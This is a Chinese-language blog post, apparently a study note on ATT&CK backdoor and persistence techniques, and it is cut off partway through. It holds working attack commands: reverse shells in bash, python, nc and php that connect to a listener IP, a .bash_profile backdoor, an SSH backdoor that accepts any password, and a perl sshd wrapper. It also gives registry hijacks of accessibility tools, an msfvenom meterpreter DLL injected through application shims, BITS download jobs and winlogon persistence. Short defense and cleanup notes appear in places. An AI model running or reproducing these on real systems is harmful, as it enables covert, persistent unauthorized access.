            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
        </a>
        
        <a  class=""
           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"
           data-tag="工具,内网渗透"
           data-author="" >
            <span class="post-title" title="端口转发">端口转发</span>
            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之safedog">绕WAF之safedog</span>
            <span class="post-date" title="2019-12-27 20:28:35">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E5%9F%BA%E7%A1%80/"
           data-tag="知识,WAF"
           data-author="" >
            <span class="post-title" title="绕WAF基础">绕WAF基础</span>
            <span class="post-date" title="2019-12-03 11:37:29">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/%E8%84%91%E5%9B%BE/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="脑图">脑图</span>
            <span class="post-date" title="2019-12-05 19:24:56">2019/12/05</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳一">脱壳一</span>
            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳二">脱壳二</span>
            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-ATT-CK学习" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">ATT-CK学习</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            
            <a class="color3">知识</a>
            
            <a class="color4">backdoor</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title=''>2020-01-13 10:26<br/>
        更新时间: 2020-03-15 13:22:07
        </time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Linux后门批量kill"><span class="toc-text">0x01 Linux后门批量kill</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-Linux"><span class="toc-text">0x10 Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-T1156-Linux-bash-profile-and-bashrc"><span class="toc-text">0x11 T1156-Linux .bash_profile and .bashrc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-Linux-reverse-shell"><span class="toc-text">0x12 Linux-reverse shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X13-Linux-SSH-backdoor"><span class="toc-text">0X13 Linux-SSH backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-windows"><span class="toc-text">0x20 windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-T1015-Windows-Accessibility-Features（辅助功能）"><span class="toc-text">0x21 T1015-Windows Accessibility Features（辅助功能）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x22-T1098-windows-Admin-Account-Manipulate（管理员账户操作）"><span class="toc-text">0x22 T1098-windows Admin Account Manipulate（管理员账户操作）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x23-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）"><span class="toc-text">0x23 T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x24-T1197-windows-BITS-Jobs-Windows后台智能传输服务"><span class="toc-text">0x24 T1197-windows BITS Jobs (Windows后台智能传输服务)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x25-T1004-windows-winlogon"><span class="toc-text">0x25 T1004-windows winlogon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x26-T1042-Change-Default-File-Association-更改默认文件关联"><span class="toc-text">0x26 T1042-Change Default File Association(更改默认文件关联)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-Linux-and-windows"><span class="toc-text">0x30 Linux and windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x31-T1136-Creat-Account（创建账号）"><span class="toc-text">0x31 T1136-Creat Account（创建账号）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x32-T1158-Hidden-Files-and-Directories（隐藏的文件和目录）"><span class="toc-text">0x32 T1158 - Hidden Files and Directories（隐藏的文件和目录）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-web-server-OR-application-program"><span class="toc-text">0x40 web server OR application program</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x41-T1100-windows-Linux-web-shell"><span class="toc-text">0x41 T1100-windows/Linux web shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x42-T1176-Browser-Extensions（浏览器扩展）"><span class="toc-text">0x42 T1176-Browser Extensions（浏览器扩展）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-privilege-escalation"><span class="toc-text">0x50 privilege escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x51-T1044-File-System-Permissions-Weakness"><span class="toc-text">0x51 T1044 - File System Permissions Weakness</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xF0-其他"><span class="toc-text">0xF0 其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFE-参考"><span class="toc-text">0xFE 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-帮助附录"><span class="toc-text">0xFF 帮助附录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#red-team"><span class="toc-text">red team</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/11.png" alt></p>
<ol>
<li>重点讲后门与权限维持。</li>
</ol>
<h2 id="0x01-Linux后门批量kill"><a href="#0x01-Linux后门批量kill" class="headerlink" title="0x01 Linux后门批量kill"></a>0x01 Linux后门批量kill</h2><ol>
<li>ps -ef | grep “keyword” |awk ‘{print $2}’ |xargs kill -9 #-e：所有进程，-f：完整格式，grep：匹配相关关键字，awk：过滤出pid，xargs：将管道数据转换为命令参数，总：kill相关关键字的进程</li>
<li>例子：</li>
<li>ps -ef | grep “python” |awk ‘{print $2}’ |xargs kill -9</li>
<li>ps -ef | grep “bash -i” |awk ‘{print $2}’ |xargs kill -9</li>
</ol>
<h2 id="0x10-Linux"><a href="#0x10-Linux" class="headerlink" title="0x10 Linux"></a>0x10 Linux</h2><h3 id="0x11-T1156-Linux-bash-profile-and-bashrc"><a href="#0x11-T1156-Linux-bash-profile-and-bashrc" class="headerlink" title="0x11 T1156-Linux .bash_profile and .bashrc"></a>0x11 T1156-Linux .bash_profile and .bashrc</h3><ol>
<li>~/.bash_profile 和 ~/.bashrc是包含shell命令的shell脚本。当打开新shell或者用户登录时，这些文件都会被执行。</li>
<li>~/.bash_profile用于登录shell，~/.bashrc用于交互式非登录shell。</li>
<li>通俗说，当用户使用账号密码本地登录或远程登录（SSH）时，~/.bash_profile将在返回初始命令提示符之前被执行。之后，打开新的shell，都会执行~/.bashrc脚本。</li>
<li>危害：攻击者可能通过这些脚本插入可执行文件或命令来获取持久性的后门。</li>
<li><a href="https://blog.csdn.net/duzilonglove/article/details/79729840" target="_blank" rel="noopener">~/.bash_profile 和 ~/.bashrc之间的详细说明与区别</a></li>
</ol>
<p><strong>本地测试~/.bash_profile</strong></p>
<ol>
<li>本机：192.168.100.1</li>
<li>虚拟机：192.168.100.15，Centos 7</li>
<li>虚拟机添加反弹shell命令到~/.bash_profile</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/1.png" alt></li>
<li>本机打开监听端口，重启虚拟机，输入账号密码后，成功反弹shell</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/2.png" alt></li>
<li>弊端：直接这样反弹shell，虚拟机会一直卡住在登录中~，容易被发现，停止交互shell后，虚拟机才会登录成功</li>
<li>执行后门文件，python反弹shell</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/3.png" alt></li>
<li>反弹shell成功且用户成功登录</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/4.png" alt></li>
</ol>
<p><strong>本地测试~/.bashrc</strong></p>
<ol>
<li>同样，把执行命令添加到~/.bashrc，保存，本机打开监听</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/5.png" alt></li>
<li>只要虚拟机打开新shell，都会反弹shell（执行命令）</li>
<li>图略</li>
</ol>
<p><strong>防御</strong></p>
<ol>
<li>检查相关文件预防是否被留后门</li>
<li>扫描本地是否存在后门文件或隐藏的后门文件</li>
<li>检查是否存在敏感进程或隐藏进程</li>
</ol>
<h3 id="0x12-Linux-reverse-shell"><a href="#0x12-Linux-reverse-shell" class="headerlink" title="0x12 Linux-reverse shell"></a>0x12 Linux-reverse shell</h3><p>测试环境：192.168.100.4、192.168.100.8、192.168.100.15<br><strong>bash</strong></p>
<ol>
<li>远程服务器终端执行命令：bash -i &gt;&amp; /dev/tcp/[本地主机IP]/[指定端口] 0&gt;&amp;1 #0：标准输入，1：标准输出，2：标准错误，&gt;、&lt;：重定向，0&gt;1：标准输入重定向到文件1,0&gt;&amp;1：标准输入重定向到标准输出，&gt;&amp;：重定向标准输出和标准错误</li>
<li>本地主机监听命令：nc -lvp [指定端口]</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/33.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/34.png" alt></li>
</ol>
<p><strong>python</strong></p>
<ol>
<li>192.168.100.15：python -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.100.4’,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);”</li>
<li>192.168.100.4：nc -lvp 8888</li>
</ol>
<p><strong>nc</strong></p>
<ol>
<li>192.168.100.15全功能版本（带-e参数）：nc -e /bin/bash 192.168.100.4 8888</li>
<li>192.168.100.4：nc -lvp 8888</li>
</ol>
<p><strong>nc与管道符</strong></p>
<ol>
<li>192.168.100.4：nc -lvp 7777 #负责发送命令</li>
<li>192.168.100.4：nc -lvp 8888 #负责接收信息</li>
<li>192.168.100.15：nc 192.168.100.4 7777 | /bin/bash | nc 192.168.100.4 8888</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/35.png" alt></li>
</ol>
<p><strong>php</strong></p>
<ol>
<li>php -r ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1”);’</li>
</ol>
<p><strong>java</strong><br><strong>perl</strong><br><strong>ruby</strong><br>…</p>
<h2 id="0X13-Linux-SSH-backdoor"><a href="#0X13-Linux-SSH-backdoor" class="headerlink" title="0X13 Linux-SSH backdoor"></a>0X13 Linux-SSH backdoor</h2><p><strong>ssh免密登录后门</strong></p>
<ol>
<li>正常的密码登录</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/36.png" alt></li>
<li>ln -sf /usr/sbin/sshd /tmp/su;nohup /tmp/su -oPort=2222 &amp;</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/37.png" alt></li>
<li>再次登录，输入任意密码即登录成功</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/38.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/39.png" alt></li>
<li><a href="https://www.freebuf.com/articles/system/138753.html" target="_blank" rel="noopener">参考</a></li>
</ol>
<p><strong>perl脚本伪装sshd</strong></p>
<ol>
<li>先转换端口为big 网络字节序中的16进制字符串\x00\x00XX格式</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/40.png" alt></li>
<li>得 \x00\x0009</li>
<li>perl脚本内容<pre><code>#!/usr/bin/perl
exec&quot;/bin/bash&quot;if(getpeername(STDIN)=~/^..09/);
exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;.@ARGV;</code></pre></li>
<li>把/usr/sbin/sshd移到/usr/bin/sshd</li>
<li>将伪装的perl脚本保存到/usr/sbin/sshd</li>
<li>赋权：chmod +x /usr/sbin/sshd</li>
<li>重启服务：/etc/init.d/ssh restart</li>
<li>本地主机：socat STDIO TCP4:192.168.100.8:22,sourceport=12345</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/41.png" alt></li>
<li>查看进程连接</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/42.png" alt></li>
<li>增强隐蔽性，copy /bin/bash 重命名为/bin/sshd，perl代码改为<pre><code>#!/usr/bin/perl
exec&quot;/bin/sshd&quot;if(getpeername(STDIN)=~/^..09/);
exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;.@ARGV;</code></pre></li>
</ol>
<p><strong>SSH公钥免密登录</strong><br>…</p>
<h2 id="0x20-windows"><a href="#0x20-windows" class="headerlink" title="0x20 windows"></a>0x20 windows</h2><h3 id="0x21-T1015-Windows-Accessibility-Features（辅助功能）"><a href="#0x21-T1015-Windows-Accessibility-Features（辅助功能）" class="headerlink" title="0x21 T1015-Windows Accessibility Features（辅助功能）"></a>0x21 T1015-Windows Accessibility Features（辅助功能）</h3><ol>
<li>windows有辅助功能，可以在用户登录之前（登录窗口屏幕），打开组合键启动。</li>
<li>攻击者可以修改这些功能或程序的启动方式，来获取命令提示符或后门程序，而不需登录系统。</li>
<li>两种常见的辅助功能程序分别是</li>
<li>C:\Windows\System32\sethc.exe：按五次Shift键启动</li>
<li>C:\Windows\System32\utilman.exe时启动；按Windows + U组合键启动。</li>
<li>其他辅助功能：</li>
<li>On-Screen Keyboard: C:\Windows\System32\osk.exe</li>
<li>Magnifier: C:\Windows\System32\Magnify.exe</li>
<li>Narrator: C:\Windows\System32\Narrator.exe</li>
<li>Display Switcher: C:\Windows\System32\DisplaySwitch.exe</li>
<li>App Switcher: C:\Windows\System32\AtBroker.exe</li>
</ol>
<p><strong>本地测试</strong></p>
<ol>
<li>虚拟机：windows server 2008</li>
<li>例如：osk.exe</li>
<li>powershell（需要管理员权限）终端<a href="#jump1">执行下面代码</a>（整块复制执行，报错就键盘输入）</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/6.png" alt></li>
<li>执行之后，刷新注册表，就会显示添加成功</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/7.png" alt></li>
<li>然后执行C:\Windows\System32\osk.exe，就会弹出cmd.exe，<a href="#jump2">清除命令</a></li>
<li>同理，<a href="#jump1">执行代码</a>中的osk.exe可换成sethc.exe、utilman.exe、magnify.exe、narrator.exe、DisplaySwitch.exe、atbroker.exe</li>
<li>实在执行不了，就一步步来：win+r——regedit——HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options——新建项——命名例如sethc.exe——新建字符串值——名称debugger——数据C:\Windows\System32\cmd.exe，然后锁屏，按五次shift</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/8.png" alt></li>
</ol>
<p><span id="jump1">辅助功能：powershell执行代码</span></p>
<pre><code>$registryPath = &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot;
$Value = &quot;C:\windows\system32\cmd.exe&quot;
$Name = &quot;Debugger&quot;
IF(!(Test-Path $registryPath))
 {
  New-Item -Path $registryPath -Force
  New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
 }
ELSE
 {
  New-ItemProperty -Path $registryPath -Name $name -Value $Value
 }</code></pre><p><span id="jump2">清除命令</span></p>
<pre><code>reg delete &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; /v Debugger /f</code></pre><p><strong>防御</strong></p>
<ol>
<li>查看注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下是否存在可疑项</li>
<li>查看C盘下是否存在可疑的可执行后门文件</li>
<li>查看进程是否存在可疑进程</li>
<li>监控可执行文件和执行命令</li>
</ol>
<h3 id="0x22-T1098-windows-Admin-Account-Manipulate（管理员账户操作）"><a href="#0x22-T1098-windows-Admin-Account-Manipulate（管理员账户操作）" class="headerlink" title="0x22 T1098-windows Admin Account Manipulate（管理员账户操作）"></a>0x22 T1098-windows Admin Account Manipulate（管理员账户操作）</h3><ol>
<li>账户被操作，会影响管理员的维护与某些权限的访问。操作有：修改权限，修改登录密码，添加或删除用户或用户组，修改原用户配置、系统配置等等操作。</li>
<li>powershell（管理员权限）终端<a href="#jump3">执行代码</a>，报错可能是版本问题（2.0 没有Get-CIMInstance），或者字符串格式问题等</li>
<li>$PSVersionTable #查看版本，2.0</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/9.png" alt></li>
<li><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=30653" target="_blank" rel="noopener">先安装Microsoft .NET Framework 4.5</a></li>
<li><a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-windows-powershell?view=powershell-6" target="_blank" rel="noopener">更新powershell版本</a></li>
<li>再看看版本：$PSVersionTable，5.1</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/10.png" alt></li>
<li>再<a href="#jump3">执行代码</a></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/12.png" alt></li>
<li>Administrator已被重命名</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/13.png" alt></li>
<li>手动改名（改回），右击我的电脑——管理——本地用户和组——用户——刚改的名字——右击——重命名——xxx</li>
</ol>
<p><span id="jump3">原脚本</span></p>
<pre><code>$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter &quot;name = &#39;Administrators&#39;&quot; | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like &quot;*Administrator*&quot;) {
        Rename-LocalUser -Name $member.Name -NewName &quot;HaHaHa_$x$y$z$w&quot;
        Write-Host &quot;Successfully Renamed Administrator Account on&quot; $hostname
        }
    }</code></pre><h3 id="0x23-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）"><a href="#0x23-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）" class="headerlink" title="0x23 T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）"></a>0x23 T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）</h3><ol>
<li>Microsoft为了解决与新windows操作系统的旧应用程序不兼容的问题，发布了应用程序兼容性工具包ACT，属于<a href="https://docs.microsoft.com/en-gb/windows-hardware/get-started/adk-install" target="_blank" rel="noopener">windows评估和部署工具包ADK</a>的一部分。</li>
<li>该工具包含一个“injectdll”的修复程序，可用于将DLL注入应用程序达到持久控制的作用。</li>
<li>msfvenom生成反弹shell的dll后门程序</li>
<li>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4444 -f dll&gt;test.dll</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/14.png" alt></li>
<li><a href="https://docs.microsoft.com/zh-cn/windows-hardware/get-started/adk-install" target="_blank" rel="noopener">Microsoft Application Compatibility Toolkit</a></li>
<li>启动应用程序兼容性工具包</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/16.png" alt></li>
<li>选择一个已安装的应用程序</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/17.png" alt></li>
<li>可用的针对32位应用程序的兼容性修补程序有369个，选择injectdll，使用刚使用msfvenom生成的dll文件注入Firefox。</li>
<li>点击Parameters，设置dll文件的位置</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/18.png" alt></li>
<li>save，保存为test.sdb</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/15.png" alt></li>
<li>可在Microsoft Application Compatibility Toolkit中直接选择安装</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/24.png" alt></li>
<li>sdbinst.exe（默认位于c:\windows\system32下）是用于部署自定义数据库文件的应用程序，也可以使用<a href="https://github.com/evil-e/sdb-explorer" target="_blank" rel="noopener">sdb-explorer</a>来安装程序</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/19.png" alt></li>
<li>该应用程序已安装在系统</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/20.png" alt></li>
<li>shim数据库文件已被复制到windows目录下</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/21.png" alt></li>
<li>msfconsole启动监听</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/22.png" alt></li>
<li>服务器启动Firefox，msf就获取到meterpreter会话了。</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/23.png" alt></li>
<li><strong>除了生成.sdb文件，还可以直接创建新的shim数据库文件，powershell执行命令</strong></li>
<li>Copy-Item …….\*.sdb C:\Windows\apppatch\Custom\*.sdb</li>
<li>Copy-Item …….\*.sdb C:\Windows\apppatch\Custom64\*.sdb</li>
<li>清除命令</li>
<li>Remove-Item C:\Windows\apppatch\Custom\*.sdb</li>
<li>Remove-Item C:\Windows\apppatch\Custom64\*.sdb</li>
<li><strong>还可以修改注册表，powershell执行命令</strong></li>
<li>New-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom” -Name “test” -Value “test”</li>
<li>New-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB” -Name “test” -Value “test”</li>
<li>清除命令</li>
<li>Remove-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom” -Name “test”</li>
<li>Remove-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB” -Name “test”</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/25.png" alt></li>
</ol>
<p><strong>参考</strong><br><a href="https://pentestlab.blog/2019/12/16/persistence-application-shimming/" target="_blank" rel="noopener">https://pentestlab.blog/2019/12/16/persistence-application-shimming/</a><br><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="noopener">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/</a><br><a href="https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md</a></p>
<h3 id="0x24-T1197-windows-BITS-Jobs-Windows后台智能传输服务"><a href="#0x24-T1197-windows-BITS-Jobs-Windows后台智能传输服务" class="headerlink" title="0x24 T1197-windows BITS Jobs (Windows后台智能传输服务)"></a>0x24 T1197-windows BITS Jobs (Windows后台智能传输服务)</h3><ol>
<li>BITS (后台智能传送服务) 是一个Windows组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</li>
<li>攻击者可能会运行恶意代码后滥用BITS进行下载，执行甚至清理文件，这些危险操作，可能防火墙是允许的。</li>
<li>使用bitsadmin.exe执行命令</li>
<li>bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}</li>
<li>清除命令</li>
<li>del #{local_file}</li>
<li><strong>powershell执行</strong></li>
<li>Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}</li>
<li><strong>例子</strong></li>
<li>bitsadmin.exe /transfer /Download /priority Foreground <a href="http://192.168.100.3/1.txt" target="_blank" rel="noopener">http://192.168.100.3/1.txt</a> f:\test\11.txt</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/43.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/44.png" alt></li>
<li>清除命令</li>
<li>Remove-Item #{local_file}</li>
<li>多步下载执行脚本</li>
<li>bitsadmin.exe /create #{bits_job_name}</li>
<li>bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}</li>
<li>bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}</li>
<li>bitsadmin.exe /complete AtomicBITS</li>
<li>bitsadmin.exe /resume #{bits_job_name}</li>
</ol>
<h3 id="0x25-T1004-windows-winlogon"><a href="#0x25-T1004-windows-winlogon" class="headerlink" title="0x25 T1004-windows winlogon"></a>0x25 T1004-windows winlogon</h3><ol>
<li>winlogon.exe是windows NT用户登录程序，用于管理用户登录、注销以及ctrl+alt+delete触发的secure attention sequence。</li>
<li>位置：C:\Windows\System32</li>
<li>注册表：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
<li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
</ol>
<p><strong>winlogon shell Key Persistence（持久性）</strong></p>
<ol>
<li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Shell” “explorer.exe, [要执行的程序]” -Force</li>
<li><strong>测试：设置命令</strong></li>
<li>powershell执行：Set-ItemProperty “HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Shell” “explorer.exe, c:\windows\system32\notepad.exe” -Force</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/26.png" alt></li>
<li>重启，同时自动启动了notepad.exe</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/27.png" alt></li>
<li><strong>清除命令</strong></li>
<li>Remove-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name “Shell” -Force</li>
</ol>
<p><strong>Winlogon Userinit Key Persistence（持久性）</strong></p>
<ol>
<li><strong>设置命令</strong></li>
<li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Userinit” “Userinit.exe, [要执行的程序]” -Force</li>
<li><strong>清除命令</strong></li>
<li>Remove-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name “Userinit” -Force</li>
</ol>
<p><strong>Winlogon Notify Key Logon Persistence（持久性）</strong></p>
<ol>
<li><strong>设置命令</strong></li>
<li>New-Item “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” -Force</li>
<li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” “logon” “[要执行的程序]” -Force</li>
<li><strong>清除命令</strong></li>
<li>Remove-Item “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” -Force</li>
</ol>
<h2 id="0x26-T1042-Change-Default-File-Association-更改默认文件关联"><a href="#0x26-T1042-Change-Default-File-Association-更改默认文件关联" class="headerlink" title="0x26 T1042-Change Default File Association(更改默认文件关联)"></a>0x26 T1042-Change Default File Association(更改默认文件关联)</h2><ol>
<li>打开文件时，将检查用于打开文件的默认程序（文件关联或处理程序）。</li>
<li>文件关联选择储存在windows注册表中，可由用户、管理员或具有注册表访问权限的程序进行编辑，也可由管理员使用内置的assoc实用程序进行编辑。</li>
<li>攻击者可修改给定文件扩展名的文件关联，目的是打开具有给定扩展名的文件时调用指定程序。</li>
<li><strong>例子：</strong></li>
<li>windows下的.txt默认是使用notepad.exe打开</li>
<li>注册表位置：</li>
